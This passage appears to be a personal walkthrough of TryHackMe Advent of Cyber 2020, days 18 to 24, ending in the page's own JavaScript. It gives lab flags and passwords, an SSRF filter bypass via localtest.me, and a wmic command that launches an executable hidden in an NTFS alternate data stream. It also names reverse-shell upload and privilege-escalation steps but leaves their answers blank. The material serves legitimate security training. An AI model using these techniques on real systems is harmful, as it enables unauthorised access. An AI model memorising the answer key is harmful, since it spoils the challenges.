+  <li>What is the value of local_4h before eax is set to 0?</li>
+</ol>
+
+<p>A: 6</p>
+
+<h2 id="day-18-the-bits-of-christmas">[Day 18] The Bits of Christmas</h2>
+
+<p>#reverseengineering #reverse #.NET #remmina</p>
+
+<ul>
+  <li>NET framework can be disassembled using tools such as <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a> or <a href="https://www.jetbrains.com/decompiler/">Dotpeek</a>.</li>
+</ul>
+
+<h3 id="questions-11">Questions</h3>
+
+<ol>
+  <li>
+    <p>Open the “TBFC_APP” application in ILspy and begin decompiling the code</p>
+  </li>
+  <li>
+    <p>What is Santa’s password?</p>
+  </li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/remminaa.png" alt="" /></p>
+
+<p><img src="/tryhackme/AdventCalendar2020/santapass.png" alt="" /></p>
+
+<p>A: santapassword321</p>
+
+<ol>
+  <li>Now that you’ve retrieved this password, try to login…What is the flag?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/flagagag.png" alt="" /></p>
+
+<p>A: thm{046af}</p>
+
+<h2 id="day-19-special-by-tib3rius-the-naughty-or-nice-list">[Day 19] <code class="language-plaintext highlighter-rouge">Special by Tib3rius</code> The Naughty or Nice List</h2>
+
+<p>#ssrf</p>
+
+<ul>
+  <li>
+    <p><strong>Server-Side Request Forgery (SSRF)</strong> is a web app vulnerability that allows attackers to force the web application server to make requests to resources it normally wouldn’t.</p>
+  </li>
+  <li>
+    <p>For example, a web app may have the functionality to produce screenshots of other websites when a user supplies a URL.</p>
+  </li>
+  <li>
+    <p>This is perfectly valid functionality, however, URLs can also be made for internal IP addresses (e.g. 192.168.1.1, 10.10.10.10, 127.0.0.1 etc.) as well as internal-only hostnames (e.g. localhost, WIN2019SERV.CORP).</p>
+
+    <ul>
+      <li>If a web developer is not careful, an attacker could provide the app with these and manage to screenshot internal resources, which often have less protections.</li>
+    </ul>
+  </li>
+  <li>
+    <p>To counter this, user-provided URLs can be checked before they are requested, to ensure that malicious values are not being used.</p>
+  </li>
+  <li>
+    <p>Note that while the example of SSRF used in this task is effectively a <em>Remote File Inclusion</em> (RFI) vulnerability as well, not every SSRF is.</p>
+  </li>
+  <li>
+    <p>Some SSRF vulnerabilities only trigger a DNS lookup, while others may not return any kind of response to the web app, but can still be used to “port scan” internal systems by measuring the time each request takes to complete.</p>
+  </li>
+  <li>
+    <p>In other cases, SSRF may be used as a form of Denial of Service (DoS) since the attacker can continually request that the server download large files simultaneously (taking up memory, disk space, and network bandwidth).</p>
+  </li>
+</ul>
+
+<h3 id="questions-12">Questions</h3>
+
+<ul>
+  <li>
+    <p>search Santa and got smth which URL encoded would
+look like this: <code class="language-plaintext highlighter-rouge">http://list.hohoho:8080/search.php?name=Santa</code></p>
+  </li>
+  <li>
+    <p>obvs, <code class="language-plaintext highlighter-rouge">.hohoho</code> is not a valid TLD and this means this is some sort of a back-end machine that the website uses.</p>
+
+    <ul>
+      <li>
+        <p>how it should work: our request is sent to the back-end which returns the result to the front-end and thus tu us.</p>
+      </li>
+      <li>
+        <p>potential SSRF</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Enumerating open ports via SSRF can be performed in this manner, by iterating over common ports and measuring the differences between responses.</p>
+
+    <ul>
+      <li>Even in cases where error messages aren’t returned, it is often possible to detect which ports are open vs closed by measuring the time each request takes to complete.</li>
+    </ul>
+  </li>
+  <li>
+    <p>if we substitute the website with <code class="language-plaintext highlighter-rouge">127.0.0.1</code>, we get a message that this is blocked by the security team.</p>
+
+    <ul>
+      <li>it means the server’s name must start with <code class="language-plaintext highlighter-rouge">list.hohoho</code></li>
+    </ul>
+  </li>
+  <li>
+    <p>Since the hostname simply needs to start with “list.hohoho”, we can take advantage of DNS subdomains and create our own domain “list.hohoho.evilsite.com” which resolves to 127.0.0.1.</p>
+  </li>
+  <li>
+    <p>In fact, we don’t even need to buy a domain or configure the DNS, because multiple domains already exist that let us do this. The one we will be using is <strong>localtest.me</strong>, which resolves every subdomain to 127.0.0.1.</p>
+  </li>
+  <li>
+    <p>We can therefore set the hostname in the URL to “list.hohoho.localtest.me”, bypass the check, and access local services:</p>
+
+    <ul>
+      <li>we will use <code class="language-plaintext highlighter-rouge">http://list.hohoho.localtest.me</code> which we will need to URL encode and then provide to <code class="language-plaintext highlighter-rouge">proxy</code> in the URL itself.</li>
+    </ul>
+  </li>
+  <li>
+    <p>McSkidy gave away the password and the username is easily guessable</p>
+  </li>
+  <li>
+    <p>now we can log in with the username: Santa and pass: Be good for goodness sake!</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/santapasdasd.png" alt="" /></p>
+
+<ul>
+  <li>we get redirected here</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/adminoanel.png" alt="" /></p>
+
+<ul>
+  <li>deleting the naughty list gives us the flag.</li>
+</ul>
+
+<ol>
+  <li>What is Santa’s password?</li>
+</ol>
+
+<p>A: Be good for goodness sake!</p>
+
+<ol>
+  <li>What is the challenge flag?</li>
+</ol>
+
+<p>A: THM{EVERYONE_GETS_PRESENTS}</p>
+
+<h2 id="day-20-blue-teaming-powershellf-to-the-rescue">[Day 20] <code class="language-plaintext highlighter-rouge">Blue Teaming</code> PowershELlF to the rescue</h2>
+<p>#powershell</p>
+
+<ul>
+  <li>
+    <p>Official: “PowerShell is a cross-platform task automation and configuration management framework, consisting of a command-line shell and scripting language. Unlike most shells, which accept and return text, PowerShell is built on top of the .NET Common Language Runtime (CLR), and accepts and returns .NET objects. This fundamental change brings entirely new tools and methods for automation.”</p>
+  </li>
+  <li>
+    <p>PowerShell has grown in popularity in the last few years among defenders and especially attackers.</p>
+  </li>
+  <li>
+    <p>PowerShell commands are known as <strong>cmdlets</strong>.</p>
+  </li>
+  <li>
+    <p>To list the contents of the current directory we are in, we can use the <code class="language-plaintext highlighter-rouge">Get-ChildItem</code> cmdlet.</p>
+  </li>
+  <li>
+    <p>There are various other options we can use with this cmdlet to enhance its capabilities further:</p>
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-Path</code> -&gt; Specifies a path to one or more locations.</p>
+
+        <ul>
+          <li>Wildcards are accepted.</li>
+        </ul>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-File / -Directory</code> -&gt; To get a list of files, use the File parameter.</p>
+      </li>
+    </ul>
+
+  	- To get a list of directories, use the Directory parameter. 
+
+  	- You can use the Recurse parameter with File and/or Directory parameters.
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-Filter</code> -&gt; Specifies a filter to qualify the Path parameter.</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-Recurse</code> -&gt; Gets the items in the specified locations and in all child items of the locations.</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-Hidden</code> -&gt; To get only hidden items, use the Hidden parameter.</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">-ErrorAction SilentlyContinue</code> -&gt; Specifies what action to take if the command encounters an error.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>For example, if you want to view all of the hidden files in the current directory you are in, you can issue the following command: <code class="language-plaintext highlighter-rouge">Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue</code></p>
+  </li>
+  <li>
+    <p>Another useful cmdlet is <code class="language-plaintext highlighter-rouge">Get-Content</code> -&gt; allow you to read the contents of a file.</p>
+
+    <ul>
+      <li>
+        <p>Ex: <code class="language-plaintext highlighter-rouge">Get-Content -Path file.txt</code></p>
+      </li>
+      <li>
+        <p>you can run numerous operations with the <code class="language-plaintext highlighter-rouge">Get-Content</code> cmdlet to give you more information about the particular file you are inspecting, such as how many words are in the file and the exact positions for a particular string within a file.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>to get the number of words contained within a file, you can use the <code class="language-plaintext highlighter-rouge">Get-Content</code> cmdlet and <em>pipe</em> the results to the <code class="language-plaintext highlighter-rouge">Measure-Object</code> cmdlet.</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Get-Content -Path file.txt | Measure-Object -Word</code></li>
+    </ul>
+  </li>
+  <li>
+    <p>To get the exact position of a string within the file, you can use the following command:  <code class="language-plaintext highlighter-rouge">(Get-Content -Path file.txt)[index]</code></p>
+
+    <ul>
+      <li>
+        <p>The index is the numerical value that is the location of the string within the file.</p>
+
+        <ul>
+          <li>Since indexes start at zero, you typically need to subtract one from the original value to extract the string at the correct position.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>To change directories, you can use the <code class="language-plaintext highlighter-rouge">Set-Location</code> cmdlet.</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Set-Location -Path c:\users\administrator\desktop</code></li>
+    </ul>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Select-String</code> cmdlet will search a particular file for a pattern you define within the command to run.</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'</code></li>
+    </ul>
+  </li>
+</ul>
+
+<blockquote>
+  <p>Note: You can always use the <code class="language-plaintext highlighter-rouge">Get-Help</code> cmdlet to obtain more information about a specific cmdlet. For example, <code class="language-plaintext highlighter-rouge">Get-Help Select-String</code></p>
+</blockquote>
+
+<ul>
+  <li>You can also do <code class="language-plaintext highlighter-rouge">ls -Hidden -Directory</code> or <code class="language-plaintext highlighter-rouge">dir -Hidden -File</code>, because <code class="language-plaintext highlighter-rouge">ls</code> and <code class="language-plaintext highlighter-rouge">dir</code> are <strong>aliases</strong></li>
+</ul>
+
+<h3 id="questions-13">Questions</h3>
+
+<ol>
+  <li>Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?</li>
+</ol>
+
+<ul>
+  <li>displayed all of the hidden files and got the content of the one about the elf</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2008-27-49.png" alt="" /></p>
+
+<p>A: 2 front teeth</p>
+
+<ol>
+  <li>Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>Changed directory to Desktop and then searched for a hidden directory</p>
+  </li>
+  <li>
+    <p>changed to that directory and list all files in there.</p>
+  </li>
+  <li>
+    <p>output the contents of that file</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2008-32-59.png" alt="" /></p>
+
+<p>A: Scrooged</p>
+
+<ol>
+  <li>Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while)</li>
+</ol>
+
+<ul>
+  <li>You have to go to ‘c:\Windows\System32’ and search there.</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2008-51-35.png" alt="" /></p>
+
+<p>A: 3lfthr3e</p>
+
+<ol>
+  <li>How many words does the first file contain?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2008-53-50.png" alt="" /></p>
+
+<p>A: 9999</p>
+
+<ol>
+  <li>What 2 words are at index 551 and 6991 in the first file?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2008-54-49.png" alt="" /></p>
+
+<p>A: Red Ryder</p>
+
+<ol>
+  <li>This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer)</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2008-57-32.png" alt="" /></p>
+
+<p>A: red ryder bb gun</p>
+
+<h2 id="day-21-blue-teaming-time-for-some-elforensics">[Day 21] <code class="language-plaintext highlighter-rouge">Blue Teaming</code> Time for some ELForensics</h2>
+
+<p>#powershell #hash</p>
+
+<ul>
+  <li>
+    <p>a hash is basically a signature of a file</p>
+  </li>
+  <li>
+    <p>A file hash, or simply a hash, is a mathematical algorithm that analyzes the data of the file and outputs a value, which is its hash.</p>
+  </li>
+  <li>
+    <p>File hashes let us know whether a file is legitimate or not based on its verified file hash.</p>
+
+    <ul>
+      <li>If the file has been replaced or altered, the file hash will be different.</li>
+    </ul>
+  </li>
+  <li>
+    <p>With PowerShell, we can obtain the hash of a file by running the following command: <code class="language-plaintext highlighter-rouge">Get-FileHash -Algorithm MD5 file.txt</code></p>
+  </li>
+  <li>
+    <p>Another tool you can use to inspect within a binary file (.exe) is <code class="language-plaintext highlighter-rouge">Strings.exe</code>.</p>
+  </li>
+  <li>
+    <p>Strings scans the file you pass it for strings of a default length of 3 or more characters.</p>
+
+    <ul>
+      <li>
+        <p>You can use the Strings tool to peek inside this mysterious executable file.</p>
+      </li>
+      <li>
+        <p>The tool is located within C:\Tools</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>The command to run for the Strings tool to scan the mysterious executable: <code class="language-plaintext highlighter-rouge">c:\Tools\strings64.exe -accepteula file.exe</code></p>
+  </li>
+  <li>
+    <p>the output, you should notice a command related to ADS. You know this by the end of the Powershell command <code class="language-plaintext highlighter-rouge">-Stream</code>.</p>
+  </li>
+</ul>
+
+<p>#ads #ntfs</p>
+
+<ul>
+  <li>
+    <p><strong>Alternate Data Streams (ADS)</strong> is a file attribute specific to Windows <strong>NTFS (New Technology File System)</strong>.</p>
+  </li>
+  <li>
+    <p>Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data.</p>
+
+    <ul>
+      <li>Natively Window Explorer doesn’t display ADS to the user.</li>
+    </ul>
+  </li>
+  <li>
+    <p>There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files</p>
+  </li>
+  <li>
+    <p>Malware writers have used ADS to hide data in an endpoint, but not all its uses are malicious.</p>
+  </li>
+  <li>
+    <p>When you download a file from the Internet unto an endpoint there are identifiers written to ADS to identify that it was downloaded from the Internet.</p>
+  </li>
+  <li>
+    <p>The command to view ADS using Powershell: <code class="language-plaintext highlighter-rouge">Get-Item -Path file.exe -Stream *</code></p>
+  </li>
+  <li>There are a few lines of output when you run this command.
+    <ul>
+      <li>Pay particularly close attention to <strong>Stream</strong> and <strong>Length</strong>.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Recall that the <em>database connector file</em> is an executable file, and it’s hidden within an alternate data stream for another file.</p>
+  </li>
+  <li>
+    <p>We can use a built-in Windows tool, <strong>Windows Management Instrumentation</strong>, to launch the hidden file.</p>
+  </li>
+  <li>The command to run to launch the hidden executable hiding within ADS: <code class="language-plaintext highlighter-rouge">wmic process call create $(Resolve-Path file.exe:streamname)</code></li>
+</ul>
+
+<h3 id="questions-14">Questions</h3>
+
+<ol>
+  <li>Read the contents of the text file within the Documents folder. What is the file hash for db.exe?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-25-58.png" alt="" /></p>
+
+<p>A: 596690FFC54AB6101932856E6A78E3A1</p>
+
+<ol>
+  <li>What is the file hash of the mysterious executable within the Documents folder?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-26-30.png" alt="" /></p>
+
+<p>A: 5F037501FB542AD2D9B06EB12AED09F0</p>
+
+<ol>
+  <li>Using Strings find the hidden flag within the executable?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-27-51.png" alt="" /></p>
+
+<p>A: THM{f6187e6cbeb1214139ef313e108cb6f9}</p>
+
+<ol>
+  <li>What is the flag that is displayed when you run the database connector file?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-33-20.png" alt="" />
+<img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-32-52.png" alt="" /></p>
+
+<p>A: THM{088731ddc7b9fdeccaed982b07c297c}</p>
+
+<h2 id="day-22-blue-teaming-elf-mceager-becomes-cyberelf">[Day 22] <code class="language-plaintext highlighter-rouge">Blue Teaming</code> Elf McEager becomes CyberElf</h2>
+
+<p>#passwordmanagers #keepass #cyberchef</p>
+
+<ul>
+  <li>
+    <p><strong>Password managers</strong> are the norm these days.</p>
+  </li>
+  <li>
+    <p>There are many cloud-based password managers but there also are password managers you run locally on your endpoint, such as <strong>KeePass</strong>.</p>
+
+    <ul>
+      <li>KeePass is an executable that allows you to store all types of data, including passwords, in a password-protected database.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-15">Questions</h3>
+
+<ol>
+  <li>What is the password to the KeePass database?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-52-50.png" alt="" /></p>
+
+<p>A: thegrinchwashere</p>
+
+<ol>
+  <li>What is the encoding method listed as the ‘Matching ops’?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-58-19.png" alt="" /></p>
+
+<p>A: Base64</p>
+
+<ol>
+  <li>What is the decoded password value of the Elf Server?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2016-59-18.png" alt="" /></p>
+
+<ul>
+  <li>it is hex encoded, as Cyberchef confirms</li>
+</ul>
+
+<p>A: sn0wM4n!</p>
+
+<ol>
+  <li>What is the decoded password value for ElfMail?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2017-00-22.png" alt="" /></p>
+
+<p>A: ic3Skating!</p>
+
+<ol>
+  <li>Decode the last encoded value. What is the flag?</li>
+</ol>
+
+<ul>
+  <li>
+    <p>this one was a little bit more tricky</p>
+  </li>
+  <li>
+    <p>the password was ‘nothinghere’. But if I double click the entry I get a lot of stuff in the Notes section.</p>
+  </li>
+  <li>
+    <p>using the hint, I use the From Charcode Recipe twice, which gives me a github link</p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2017-07-22.png" alt="" /></p>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2017-07-38.png" alt="" /></p>
+
+<ul>
+  <li>going to the link we can find the flag</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-22%2017-08-09.png" alt="" /></p>
+
+<p>A: THM{657012dcf3d1318dca0ed864f0e70535}</p>
+
+<h2 id="day-23-blue-teaming-the-grinch-strikes-again">[Day 23] <code class="language-plaintext highlighter-rouge">Blue Teaming</code> The Grinch strikes again!</h2>
+
+<p>#ransomware #vss</p>
+
+<ul>
+  <li>
+    <p><strong>Ransomware</strong> is a type of malware that threatens to publish the victim’s data or perpetually block access to it unless a ransom is paid.</p>
+  </li>
+  <li>
+    <p>If ransomware infects an endpoint, depending on the actual malware, there might be a decryptor made available by a security vendor.</p>
+  </li>
+  <li>
+    <p>If not then you must rely on backups in order to restore your machines to the last working state, along with its files.</p>
+
+    <ul>
+      <li>Windows has a built-in feature that can assist with that.</li>
+    </ul>
+  </li>
+  <li>
+    <p>The <strong>Volume Shadow Copy Service (VSS)</strong> coordinates the actions that are required to create a consistent shadow copy (also known as a snapshot or a point-in-time copy) of the data that is to be backed up.</p>
+  </li>
+  <li>
+    <p>Malware writers know of this Windows feature and write code in their malware to look for these files and delete them.</p>
+
+    <ul>
+      <li>Doing so makes it impossible to recover from a ransomware attack unless you have an offline/off-site backup.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>The Task Scheduler</strong> enables you to automatically perform routine tasks on a chosen computer.</p>
+
+    <ul>
+      <li>Task Scheduler does this by monitoring whatever criteria you choose (referred to as triggers) and then executing the tasks when those criteria are met.</li>
+    </ul>
+  </li>
+  <li>
+    <p>The command to interact with VSS is <code class="language-plaintext highlighter-rouge">vssadmin</code>.</p>
+  </li>
+  <li>
+    <p>Running the command alone will display brief information on how to run the utility with additional commands.</p>
+
+    <ul>
+      <li>Two commands of particular interest are <code class="language-plaintext highlighter-rouge">List Volumes</code> and <code class="language-plaintext highlighter-rouge">List Shadows</code>.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Disk Management</strong> is a system utility in Windows that enables you to perform advanced storage tasks.</p>
+  </li>
+</ul>
+
+<h3 id="questions-16">Questions</h3>
+
+<ol>
+  <li>Decrypt the fake ‘bitcoin address’ within the ransom note. What is the plain text value?</li>
+</ol>
+
+<ul>
+  <li>decrypt base 64 string</li>
+</ul>
+
+<p>A: nomorebestfestivalcompany</p>
+
+<ol>
+  <li>At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?</li>
+</ol>
+
+<p>A: .grinch</p>
+
+<ol>
+  <li>What is the name of the suspicious scheduled task?</li>
+</ol>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-23%2013-22-03.png" alt="" /></p>
+
+<p>A: opidsfsdf</p>
+
+<ol>
+  <li>Inspect the properties of the scheduled task. What is the location of the executable that is run at login?</li>
+</ol>
+
+<p>A: C:\Users\Administrator\Desktop\opidsfsdf.exe</p>
+
+<ol>
+  <li>There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?</li>
+</ol>
+
+<p>A: 7a9eea15-0000-0000-0000-010000000000</p>
+
+<ol>
+  <li>Assign the hidden partition a letter. What is the name of the hidden folder?</li>
+</ol>
+
+<p>A: confidential</p>
+
+<ol>
+  <li>Right-click and inspect the properties for the hidden folder. Use the ‘Previous Versions’ tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?</li>
+</ol>
+
+<p>A: m33pa55w0rdIZseecure!</p>
+
+<h2 id="day-24-special-by-darkstar-the-trial-before-christmas">[Day 24] <code class="language-plaintext highlighter-rouge">Special by DarkStar</code> The Trial Before Christmas</h2>
+
+<h3 id="questions-17">Questions</h3>
+
+<ol>
+  <li>Scan the machine. What ports are open?</li>
+</ol>
+
+<ul>
+  <li>I firstly did a normal scan which found only port 80. Then did a scan only for ports 10000-65535</li>
+</ul>
+
+<p>A: 80, 65000</p>
+
+<ol>
+  <li>What’s the title of the hidden website? It’s worthwhile looking recursively at all websites on the box for this step.</li>
+</ol>
+
+<ul>
+  <li>the one on port 80 is just thm’s website, so I treid the other port found which redirected me to a different website</li>
+</ul>
+
+<p><img src="/tryhackme/AdventCalendar2020/Screenshot%20at%202022-04-23%2021-38-37.png" alt="" /></p>
+
+<p>A: Light Cycle</p>
+
+<ol>
+  <li>What is the name of the hidden php page?</li>
+</ol>
+
+<ul>
+  <li>used the command <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u &lt;ip&gt;:65000/ -x php</code></li>
+</ul>
+
+<p>A: uploads.php</p>
+
+<ol>
+  <li>What is the name of the hidden directory where file uploads are saved?</li>
+</ol>
+
+<ul>
+  <li>used gobuster without <code class="language-plaintext highlighter-rouge">-x</code> flag</li>
+</ul>
+
+<p>A: grid</p>
+
+<ol>
+  <li>Bypass the filters. Upload and execute a reverse shell.</li>
+</ol>
+
+<p>#client-sidefilters</p>
+
+<ul>
+  <li>
+    <p>In many ways, client-side filters are easier to bypass than their server-side equivalents as they execute on your own attacking computer – putting them under the control of an attacker.</p>
+
+    <ul>
+      <li>For this reason, client-side filters should never be used as the sole security measure for the file upload functionality on a website.</li>
+    </ul>
+  </li>
+</ul>
+
+<blockquote>
+  <p>how would we bypass a client-side filter?</p>
+</blockquote>
+
+<ul>
+  <li>The easiest way is by using BurpSuite to intercept the JavaScript code file containing the filter before it ever actually reaches our browser, then either drop the file entirely or remove the filter from the code.</li>
+</ul>
+
+<ol>
+  <li>What is the value of the web.txt flag?</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Upgrade and stabilize your shell.</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Access the database and discover the encrypted credentials. What is the name of the database you find these in?</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Crack the password. What is it?</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Use su to login to the newly discovered user by exploiting password reuse.</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>What is the value of the user.txt flag?</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Check the user’s groups. Which group can be leveraged to escalate privileges?</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>Abuse this group to escalate privileges to root.</li>
+</ol>
+
+<p>A:</p>
+
+<ol>
+  <li>What is the value of the root.txt flag?</li>
+</ol>
+
+<p>A:</p>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
